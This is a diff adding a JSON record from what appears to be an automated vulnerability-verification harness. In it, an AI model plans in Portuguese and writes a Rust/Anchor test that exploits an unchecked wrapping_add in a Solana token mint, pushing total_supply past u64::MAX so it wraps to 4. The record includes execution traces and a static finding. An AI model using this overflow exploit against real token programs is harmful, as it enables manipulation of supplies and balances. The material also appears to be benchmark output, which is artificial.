@@ -1,0 +1,133 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: total_supply wrapped around to 4 instead of failing; user_balance wrapped around to 10",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2473,
+        "completion_tokens": 635,
+        "latency_s": 3.71
+      },
+      "raw": "{\n  \"plan\": \"Inicializo o ledger com total_supply = u64::MAX - 5 e user_balance = 0 via a instrucao initialize (baseline legitimo). Depois chamo mint com amount = 10, que somado ao total_supply ultrapassa u64::MAX. O wrapping_add faz total_supply dar a volta para 4 e user_balance para 10, em vez de falhar com ArithmeticOverflow. O efeito medido e que total_supply resultante e 4 (menor que o inicial), demonstrando o wrap-around.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX - 5),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\n\\nlet init_result = env.baseline(\\\"initialize ledger with near-max supply\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&init_result, &ledger_key).clone();\\n\\nlet mint_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(10u64),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet mint_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet attack_result = env.attack(\\\"mint with amount causing u64 overflow\\\", &mint_ix, &mint_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let ledger_data = after(&attack_result, &ledger_key).data();\\n    let total_supply = read_u64(ledger_data, 40);\\n    let user_balance = read_u64(ledger_data, 48);\\n    env.effect(\\n        \\\"total_supply wrapped around to 4 instead of failing\\\",\\n        total_supply == 4,\\n    );\\n    env.effect(\\n        \\\"user_balance wrapped around to 10\\\",\\n        user_balance == 10,\\n    );\\n}\"\n}",
+      "plan": "Inicializo o ledger com total_supply = u64::MAX - 5 e user_balance = 0 via a instrucao initialize (baseline legitimo). Depois chamo mint com amount = 10, que somado ao total_supply ultrapassa u64::MAX. O wrapping_add faz total_supply dar a volta para 4 e user_balance para 10, em vez de falhar com ArithmeticOverflow. O efeito medido e que total_supply resultante e 4 (menor que o inicial), demonstrando o wrap-around.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX - 5),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\n\nlet init_result = env.baseline(\"initialize ledger with near-max supply\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&init_result, &ledger_key).clone();\n\nlet mint_ix = env.anchor_ix(\n    \"mint\",\n    &(10u64),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet mint_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet attack_result = env.attack(\"mint with amount causing u64 overflow\", &mint_ix, &mint_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let ledger_data = after(&attack_result, &ledger_key).data();\n    let total_supply = read_u64(ledger_data, 40);\n    let user_balance = read_u64(ledger_data, 48);\n    env.effect(\n        \"total_supply wrapped around to 4 instead of failing\",\n        total_supply == 4,\n    );\n    env.effect(\n        \"user_balance wrapped around to 10\",\n        user_balance == 10,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger with near-max supply",
+            "result": "Success",
+            "compute_units": 5933,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000faffffffffffffff0000000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint with amount causing u64 overflow",
+            "result": "Success",
+            "compute_units": 2193,
+            "account_flags": "-w,sr",
+            "ix_head": "e4fde9e1f10fd3a0",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA",
+                "data_len": 56,
+                "head": "2b2915d5b4b05f20",
+                "digest": "b6d2a315a60e9aa2",
+                "post": "2b2915d5b4b05f20000000000000000100000000000000000000000000000000000000000000000004000000000000000a00000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "total_supply wrapped around to 4 instead of failing",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "user_balance wrapped around to 10",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5933 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2193 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: total_supply wrapped around to 4 instead of failing; user_balance wrapped around to 10"
+    }
+  ],
+  "case_id": "SSP-03-A-V1",
+  "static_finding": {
+    "category": "MATH",
+    "confidence": "high",
+    "evidence": "ledger.total_supply = ledger.total_supply.wrapping_add(amount);\nledger.user_balance = ledger.user_balance.wrapping_add(amount);",
+    "explanation": "A instrucao usa wrapping_add para atualizar total_supply e user_balance. wrapping_add descarta silenciosamente o overflow, fazendo os valores darem a volta (wrap around) em vez de falhar. Isso permite que um atacante cunhe uma quantidade que estoure u64 e reinicie os saldos para valores baixos, manipulando indevidamente os saldos. O enum ErrorCode define ArithmeticOverflow, mas ele nunca e usado, indicando que a checagem segura foi omitida.",
+    "attack_hypothesis": "Um atacante chama mint com amount proximo de u64::MAX (ou um valor que somado ao saldo atual ultrapasse u64::MAX). O wrapping_add faz total_supply e user_balance darem a volta para valores pequenos, permitindo manipular o suprimento e o saldo do usuario de forma indevida.",
+    "attack_hypothesis_note": ""
+  }
+}
